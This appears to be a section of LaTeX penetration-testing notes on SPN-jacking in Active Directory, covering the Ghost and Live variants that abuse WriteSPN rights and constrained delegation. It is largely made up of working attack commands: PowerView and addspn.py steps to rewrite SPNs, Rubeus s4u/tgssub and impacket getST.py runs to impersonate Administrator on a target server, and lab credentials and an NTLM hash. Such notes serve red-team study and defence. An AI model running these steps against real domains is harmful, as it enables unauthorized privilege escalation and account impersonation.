\section{SPN Jacking}
abuse \verb+WriteSPN+ rights (\href{https://www.semperis.com/blog/spn-jacking-an-edge-case-in-writespn-abuse/}{SPN-jacking: An Edge Case in WriteSPN Abuse}

requierements:
\begin{itemize}
    \item Beeing admin a computer with {\bf Constrained Delegation} over a service
    \item \verb+WriteSPN+ on the server running the previous service
\end{itemize}


principle rewrite the SPN of the service hosting server to any other SPN (that don't exist on the targeted server)


\subsection{Ghost SPN-Jacking }
Ghost SPN-Jacking targets scenarios where an SPN, previously associated with a computer or service account, is either no longer in use due to the deletion or renaming of the account, or it belongs to a custom service class that has been removed. Such SPNs are often left unattended in systems configured for Kerberos Constrained Delegation, creating a vulnerability ripe for exploitation.


\begin{figure}[!ht]
  \includegraphics[width=\linewidth]{ad/acl/images/ghostSPNjacking.png}
  \caption{Ghost SPN jacking}
  \label{fig:ghostSPNjacking}
\end{figure}

SRV01 has constrained delegation over some SPN on Database01 which does not exist anymore

\begin{verbatim}
Get-DomainComputer | 
    Get-DomainObjectAcl -ResolveGUIDs | 
    ?{$_.SecurityIdentifier -eq $(ConvertTo-SID <source>)}

Get-DomainComputer -TrustedToAuth | select name, msds-allowedtodelegateto
\end{verbatim}

or with \href{https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/Get-ConstrainedDelegation.ps1}{Get-ConstrainedDelegation.ps1}
\begin{verbatim}
Import-Module C:\Tools\PowerView.ps1
Import-Module C:\Tools\Get-ConstrainedDelegation.ps1
Get-ConstrainedDelegation
Get-ConstrainedDelegation -CheckOrphaned
\end{verbatim}

\begin{verbatim}
Set-DomainObject -Identity WEB01 -Set @{serviceprincipalname='<SPN>'} -Verbose
\end{verbatim}

Then {\bf S4U (KCD)} (using mimikatz or Shadow creds to get hash NTLM):
\begin{verbatim}
.\Rubeus.exe s4u /domain:inlanefreight.local \
    /user:SRV01$ /rc4:ef3d150ee77eb9000001236c52bd2793 \
    /impersonateuser:administrator /msdsspn:"dhcp/DATABASE01" /nowrap
\end{verbatim}

The ticket obtained through executing Rubeus s4u wouldn't provide us access to WEB01 due to a discrepancy in the hostname

The key aspect, however, is that this ticket is encrypted for WEB01, with the service name not encrypted within the ticket. This allows us to alter the service name to one valid and the hostname to match the target WEB01.

\begin{verbatim}
.\Rubeus.exe tgssub /ticket:<SNIP> /altservice:cifs/WEB01 /nowrap  /ptt
\end{verbatim}


\begin{figure}[!ht]
  \includegraphics[width=\linewidth]{ad/acl/images/ghostSPNjackingpath.png}
  \caption{Ghost SPN jacking Path}
  \label{fig:ghostSPNjackingpath}
\end{figure}

\subsection{Live SPN jacking}

Unlike the Ghost SPN-Jacking scenario, which involves passive manipulation of SPNs, Live SPN-Jacking requires active manipulation of SPNs currently in use within the network environmen


\begin{figure}[!ht]
  \includegraphics[width=\linewidth]{ad/acl/images/liveSPNjacking.png}
  \caption{Live SPN jacking}
  \label{fig:liveSPNjacking}
\end{figure}
In this context, we explore the scenario with \verb+SRV01+, a server configured for Constrained Delegation with an SPN currently linked to \verb+EXCH03+ and \verb+DBSRV003+. Importantly, we have \verb+WriteSPN+ rights on \verb+DBSRV003+ and \verb+WEB01+.

Typically, in environments with up-to-date security updates in the Active Directory environment, {\bf only Domain Admins can assign the duplicate SPN to different accounts due to the potential for conflict}. Attempting to assign an SPN already associated with \verb+DBSRV003+ to \verb+WEB01+ would usually be blocked by the Domain Controller to prevent such disputes.


So, first remove the SPN we want to use from \verb+DBSRV003+. This temporarily eliminates the association, making it possible to add the SPN to \verb+WEB01+

\subsubsection{From Windows}

\begin{verbatim}
# clear all SP
Set-DomainObject -Identity DBSRV003 -Clear 'serviceprincipalname' -Verbose

# reset only requiered SPN

# Set the SPN
Set-DomainObject -Identity WEB01 -Set @{serviceprincipalname='dmserver/DBSRV003'} \
    -Verbose

# 
\Rubeus.exe s4u /domain:inlanefreight.local /user:SRV01$ \
    /rc4:ef3d150ee77eb9000001236c52bd2793 /impersonateuser:administrator \
    /msdsspn:"dmserver/DBSRV003" /nowrap

# alter the service name and host name to use the ticket
.\Rubeus.exe tgssub /ticket:doIGtDCCBrCgAwIBBaEDAgEWooIF<SNIP> \
    /altservice:HTTP/WEB01 /nowrap
\end{verbatim}

\begin{figure}[!ht]
  \includegraphics[width=\linewidth]{ad/acl/images/liveSPNjackingpath.png}
  \caption{Live SPN jacking Path}
  \label{fig:liveSPNjackingpath}
\end{figure}


\subsubsection{From Linux}

\begin{verbatim}
indDelegation.py -target-domain inlanefreight.local -dc-ip 172.16.92.10 \
    -dc-host dc02 inlanefreight.local/gabriel:Godisgood001
\end{verbatim}

It's a good practice to take note of the SPNs we cleared as we need to restore then later.
\begin{verbatim}
addspn.py 172.16.92.10 -u 'inlanefreight.local\gabriel' -p Godisgood001 \
    --clear -t 'DBSRV003$' -dc-ip 172.16.92.10
\end{verbatim}


\verb+addspn+ belong to \href{https://github.com/dirkjanm/krbrelayx}{Krbrelayx}
\begin{verbatim}
addspn.py 172.16.92.10 -u 'inlanefreight.local\gabriel' -p Godisgood001 \
    --spn 'dmserver/DBSRV003' -t 'WEB01$' -dc-ip 172.16.92.10
\end{verbatim}

\begin{verbatim}
getST.py -spn 'dmserver/DBSRV003' -impersonate Administrator \
    'inlanefreight.local/SRV01$' -hashes :ef3d150ee77eb9000001236c52bd2793 \
    -dc-ip 172.16.92.10

describeTicket.py <ticket>
\end{verbatim}

\href{https://github.com/fortra/impacket/pull/1256}{tgssub.py}:
\begin{verbatim}
tgssub/examples/tgssub.py \
    -in Administrator@dmserver_DBSRV003@INLANEFREIGHT.LOCAL.ccache \
    -altservice "cifs/WEB01" -out newticket.ccache
\end{verbatim}

Another method involve using the latest version of getST.py, which allows us to do all we previously did in one single command:
\begin{verbatim}
getST.py \
    -spn 'dmserver/DBSRV003' \
    -impersonate Administrator 'inlanefreight.local/SRV01$' \
    -hashes :ef3d150ee77eb9000001236c52bd2793 \
    -dc-ip 172.16.92.10 \
    -altservice "cifs/WEB01.inlanefreight.local"
\end{verbatim}

restoring:
\begin{verbatim}
for spn in $(cat DBSRV003spns.txt);
do 
    addspn.py 172.16.92.10 \
        -u 'inlanefreight.local\gabriel' -p Godisgood001\
        -t 'DBSRV003$' --spn $spn
done
\end{verbatim}


